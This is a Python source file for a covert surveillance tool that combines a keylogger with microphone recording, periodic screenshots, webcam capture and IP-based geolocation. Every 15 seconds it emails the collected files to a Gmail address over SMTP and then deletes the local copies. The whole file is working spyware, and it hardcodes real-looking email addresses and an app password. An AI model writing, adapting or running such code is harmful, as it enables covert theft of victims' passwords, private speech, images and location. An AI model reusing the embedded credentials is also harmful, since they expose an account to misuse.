import sounddevice as sd
from scipy.io.wavfile import write
import os
import socket
import platform
import time
import threading
import smtplib
from pynput.keyboard import Key, Listener
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import logging
import pyautogui
from datetime import datetime
import cv2
import webbrowser
import requests
import geocoder

# Global variables
file_path = os.path.dirname(os.path.realpath(__file__))
system_information = "system_info.txt"
audio_file = "audio.wav"
keys_information = "key_log.txt"
screenshot_folder = "screenshots"
screen_recordings_folder = "screen_recordings"
location_file = "location.txt"
seconds = 10  # Audio recording duration in seconds
fs = 44100  # Sample rate for audio or quality of the recording
email_send_to = "saifkumbay@gmail.com"
email_send_from = "najimtadvi977@gmail.com"
email_password = "olsa utyw vscn lodz"
smtp_server = "smtp.gmail.com"
smtp_port = 587

# Screen recording settings
recording_duration = 10  # Record for 10 seconds
recording_interval = 30  # Take new recording every 30 seconds
camera_resolution = (640, 480)  # Resolution for recordings
camera_fps = 20  # Frames per second

# Screenshot settings
screenshot_interval = 10  # Take screenshot every 10 seconds

# Location settings
location_interval = 10  # Update location every 5 minutes (300 seconds)

# Logging Setup
logging.basicConfig(filename=os.path.join(file_path, keys_information), level=logging.INFO)

# ===== LOCATION FUNCTIONS =====
def get_location():
    try:
        ip_response = requests.get('https://ipinfo.io')
        ip_data = ip_response.json()
        g = geocoder.ip('me')
        
        location_info = {
            'ip': ip_data.get('ip', 'Unknown'),
            'city': ip_data.get('city', 'Unknown'),
            'region': ip_data.get('region', 'Unknown'),
            'country': ip_data.get('country', 'Unknown'),
            'timezone': ip_data.get('timezone', 'Unknown'),
            'latitude': g.latlng[0] if g.latlng else ip_data.get('loc', 'Unknown').split(',')[0] if 'loc' in ip_data else 'Unknown',
            'longitude': g.latlng[1] if g.latlng else ip_data.get('loc', 'Unknown').split(',')[1] if 'loc' in ip_data else 'Unknown',
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        if location_info['latitude'] != 'Unknown' and location_info['longitude'] != 'Unknown':
            location_info['google_maps'] = f"https://www.google.com/maps/place/{location_info['latitude']},{location_info['longitude']}"
        else:
            location_info['google_maps'] = "Location coordinates not available"
        
        return location_info
        
    except Exception as e:
        print(f"Error getting location: {e}")
        return {
            'error': str(e),
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

def save_location():
    try:
        location_info = get_location()
        
        with open(os.path.join(file_path, location_file), 'w') as f:
            f.write("=== Location Information ===\n")
            f.write(f"Timestamp: {location_info['timestamp']}\n\n")
            
            if 'error' in location_info:
                f.write(f"Error: {location_info['error']}\n")
            else:
                f.write(f"IP Address: {location_info['ip']}\n")
                f.write(f"City: {location_info['city']}\n")
                f.write(f"Region/State: {location_info['region']}\n")
                f.write(f"Country: {location_info['country']}\n")
                f.write(f"Timezone: {location_info['timezone']}\n")
                f.write(f"Coordinates: {location_info['latitude']}, {location_info['longitude']}\n")
                f.write(f"\nGoogle Maps: {location_info['google_maps']}\n")
        
        return True
    except Exception as e:
        print(f"Error saving location: {e}")
        return False

def location_loop():
    while True:
        save_location()
        time.sleep(location_interval)
# ===== END LOCATION FUNCTIONS =====

# ===== SCREENSHOT FUNCTIONS (FIXED) =====
def setup_screenshot_folder():
    try:
        if not os.path.exists(screenshot_folder):
            os.makedirs(screenshot_folder)
            print(f"Created screenshot folder: {screenshot_folder}")
        return True
    except Exception as e:
        print(f"Error creating screenshot folder: {e}")
        return False

def take_screenshot():
    try:
        if not setup_screenshot_folder():
            return False
            
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_path = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
        
        # Take screenshot and verify it was created
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        
        if os.path.exists(screenshot_path):
            print(f"Screenshot saved: {screenshot_path}")
            return True
        else:
            print("Screenshot file was not created")
            return False
    except Exception as e:
        print(f"Error in take_screenshot: {e}")
        return False

def screenshot_loop():
    print("Starting screenshot loop")
    while True:
        try:
            if take_screenshot():
                print(f"Successfully took screenshot at {datetime.now()}")
            else:
                print(f"Failed to take screenshot at {datetime.now()}")
        except Exception as e:
            print(f"Error in screenshot loop: {e}")
        
        time.sleep(screenshot_interval)
# ===== END SCREENSHOT FUNCTIONS =====

# ===== ORIGINAL FUNCTIONS (UNCHANGED) =====
def computer_information():
    try:
        with open(os.path.join(file_path, system_information), "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"System: {platform.system()} {platform.version()}\n")
            f.write(f"Machine: {platform.machine()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"IP Address: {IPAddr}\n")
    except Exception as e:
        print(f"Error while gathering computer information: {e}")

# Audio recording function
def microphone():
    try:
        input_device = None
        devices = sd.query_devices()
        for idx, device in enumerate(devices):
            if device['max_input_channels'] > 0:
                input_device = idx
                break

        if input_device is None:
            print("No input device found.")
            return

        channels = sd.query_devices(input_device)['max_input_channels']
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=channels, device=input_device)
        sd.wait()
        write(os.path.join(file_path, audio_file), fs, myrecording)
    except Exception as e:
        print(f"Error recording audio: {e}")

def setup_screen_recordings_folder():
    if not os.path.exists(screen_recordings_folder):
        os.makedirs(screen_recordings_folder)

def record_screen():
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        video_file = os.path.join(screen_recordings_folder, f"recording_{timestamp}.mp4")
        
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("Could not open camera.")
            return False

        cap.set(cv2.CAP_PROP_FRAME_WIDTH, camera_resolution[0])
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, camera_resolution[1])

        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(video_file, fourcc, camera_fps, camera_resolution)

        start_time = time.time()
        while (time.time() - start_time) < recording_duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            else:
                break

        cap.release()
        out.release()
        return True
        
    except Exception as e:
        print(f"Error recording screen: {e}")
        return False

def screen_recording_loop():
    setup_screen_recordings_folder()
    while True:
        record_screen()
        time.sleep(recording_interval)

def send_email():
    try:
        message = MIMEMultipart()
        message['From'] = email_send_from
        message['To'] = email_send_to
        message['Subject'] = "Keylogger Report"
        message.attach(MIMEText("Please find the attached report.", 'plain'))

        # Attach all text files
        for filename in [keys_information, audio_file, system_information, location_file]:
            filepath = os.path.join(file_path, filename)
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    part = MIMEApplication(f.read(), Name=filename)
                    part['Content-Disposition'] = f'attachment; filename="{filename}"'
                    message.attach(part)

        # Attach screenshots
        if os.path.exists(screenshot_folder):
            for file in os.listdir(screenshot_folder):
                if file.endswith('.png'):
                    with open(os.path.join(screenshot_folder, file), 'rb') as f:
                        part = MIMEApplication(f.read(), Name=file)
                        part['Content-Disposition'] = f'attachment; filename="{file}"'
                        message.attach(part)

        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(email_send_from, email_password)
            server.sendmail(email_send_from, email_send_to, message.as_string())

    except Exception as e:
        print(f"Error sending email: {e}")

def clean_up_files():
    try:
        # Remove text files
        for filename in [keys_information, audio_file, system_information, location_file]:
            filepath = os.path.join(file_path, filename)
            if os.path.exists(filepath):
                os.remove(filepath)

        # Remove screenshots
        if os.path.exists(screenshot_folder):
            for file in os.listdir(screenshot_folder):
                os.remove(os.path.join(screenshot_folder, file))
    except Exception as e:
        print(f"Error cleaning files: {e}")

# Keylooger :-
def on_press(key):
    try:
        # Try logging the printable character (letters, numbers, symbols)
        if hasattr(key, 'char') and key.char is not None:
            logging.info(f"{key.char}")
        else:
            # Log special keys like shift, enter, etc.
            logging.info(f"[{key.name if hasattr(key, 'name') else key}]")
    except Exception as e:
        print(f"Error logging key: {e}")

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()


def run_tasks():
    try:
        threads = [
            threading.Thread(target=microphone),
            threading.Thread(target=start_keylogger),
            threading.Thread(target=screenshot_loop),
            threading.Thread(target=screen_recording_loop),
            threading.Thread(target=location_loop)
        ]

        for thread in threads:
            thread.daemon = True
            thread.start()

        while True:
            time.sleep(15)  # 15 seconds
            send_email()
            clean_up_files()

    except Exception as e:
        print(f"Error in main loop: {e}")

if __name__ == "__main__":
    try:
        computer_information()
        run_tasks()
    except KeyboardInterrupt:
        print("\nProgram stopped by user")
    except Exception as e:
        print(f"Unexpected error: {e}")
    finally:
        print("Program exiting")  # last lines still not working
